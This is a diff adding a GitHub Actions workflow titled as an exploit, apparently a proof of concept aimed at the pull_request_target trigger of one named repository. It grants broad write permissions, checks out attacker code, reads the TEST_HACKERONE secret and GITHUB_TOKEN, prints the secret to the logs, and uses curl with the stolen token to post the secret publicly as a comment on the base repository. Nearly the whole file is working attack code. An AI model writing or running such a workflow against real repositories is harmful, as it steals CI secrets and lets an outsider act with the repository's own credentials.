@@ -1,0 +1,45 @@
+name: Exploit with Write Permissions
+on: pull_request_target
+
+# CRITICAL: Add write permissions
+permissions:
+  contents: write
+  issues: write
+  pull-requests: write
+  actions: write
+  checks: write
+  statuses: write
+  deployments: write
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout attacker code
+        uses: actions/checkout@v3
+      
+      - name: Steal secrets from base repo
+        run: |
+          echo "=== STEALING FROM BASE REPOSITORY ==="
+          echo ""
+          echo "Base Repository: ${{ github.repository }}"
+          echo "Running in base repo context: ${{ github.repository == 'SvavaCapital/svava-terraform-github-actions' }}"
+          echo ""
+          
+          # Access base repo secrets
+          HACKERONE_TOKEN="${{ secrets.TEST_HACKERONE }}"
+          GH_TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          
+          echo "SECRETS CAPTURED:"
+          echo "1. TEST_HACKERONE: $HACKERONE_TOKEN"
+          echo "2. GITHUB_TOKEN: [ACCESSIBLE - ${#GH_TOKEN} chars]"
+          echo ""
+          
+          # Prove it by creating a comment AS BASE REPO
+          curl -X POST \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments" \
+            -d "{\"body\": \"**EXPLOIT PROOF**\\n\\nBase repo secrets accessed via pull_request_target!\\nTEST_HACKERONE: $HACKERONE_TOKEN\"}"
+          
+          echo "✅ Exploit successful - secrets captured!"
